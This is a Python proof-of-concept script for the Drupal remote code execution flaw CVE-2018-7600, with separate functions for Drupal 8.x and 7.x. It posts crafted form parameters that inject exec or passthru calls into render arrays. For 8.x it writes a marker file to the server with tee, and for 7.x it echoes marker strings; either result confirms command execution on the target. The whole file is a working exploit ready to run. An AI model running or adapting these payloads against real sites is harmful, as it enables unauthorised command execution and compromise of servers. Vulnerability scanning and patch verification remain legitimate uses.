#!/usr/bin/python
# coding=utf-8

import re
import json
import requests
from bs4 import BeautifulSoup


proxies = {}

# proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def drupa_8x(url):
    url = "http://" + url if '://' not in url else url.rstrip('/')
    url_path='/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
    query=url+url_path
    payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec',
               'mail[#type]': 'markup', 'mail[#markup]': 'echo ";-)" | tee wooyun.txt'}
    try:
        requests.post(query, proxies=proxies, data=payload, verify=True)
        check = requests.get(url + '/wooyun.txt', verify=True)
        if check.status_code == 200 and ';-)' in check.content:
            return check.url
    except Exception as e:
        pass
    return False



def drupa_7x(url):
    # poc is work in windows
    url = "http://" + url if '://' not in url else url.rstrip('/')
    _url_path = "/?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name" \
                "[%23markup]=echo%20;-)"
    _query=url+_url_path
    url_path_ = "/?q=file/ajax/name/%23default_value/"
    query = url + url_path_
    _payload = {"_triggering_element_name": "name", "form_id": "user_pass"}
    payload = {"form_build_id": ""}
    try:
        res = requests.post(url=_query, data=_payload)
        soup = BeautifulSoup(res.text, 'html.parser')
        result = unicode(soup.find('input', attrs={"type": "hidden", "name": "form_build_id"}))
        soup = BeautifulSoup(result, 'html.parser')
        payload["form_build_id"] = soup.input["value"]
        resp = requests.post(url=query + payload["form_build_id"], data=payload)
        if re.search(';-\)', resp.text):
            return url
    except Exception as e:
        pass
    # poc is work in linux
    get_params = {'q': 'user/password', 'name[#post_render][]': 'passthru', 'name[#markup]': 'echo okokok',
                  'name[#type]': 'markup'}
    post_params = {'form_id': 'user_pass', '_triggering_element_name': 'name'}
    try:
        r = requests.post(url, data=post_params, params=get_params)
        m = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)" />', r.text)
        if m:
            found = m.group(1)
            get_params = {'q': 'file/ajax/name/#value/' + found}
            post_params = {'form_build_id': found}
            r = requests.post(url, data=post_params, params=get_params)
            if 'okokok' in r.content:
                return url
        else:
            return False
    except Exception as e:
        pass
    return False




def poc(url):
    info = {}
    CVE_2018_7600_8x = drupa_8x(url)
    CVE_2018_7600_7x = drupa_7x(url)
    if CVE_2018_7600_8x:
        info.update({"CVE_2018_7600_8x": CVE_2018_7600_8x})
    if CVE_2018_7600_7x:
        info.update({"CVE_2018_7600_7x": CVE_2018_7600_7x})
    if len(info) > 0:
        return json.dumps(info, indent=2, ensure_ascii=False)
    else:
        return False



if __name__ == '__main__':
    print poc('http://127.0.0.1:8080')
    print poc('http://192.168.55.155/drupal7')
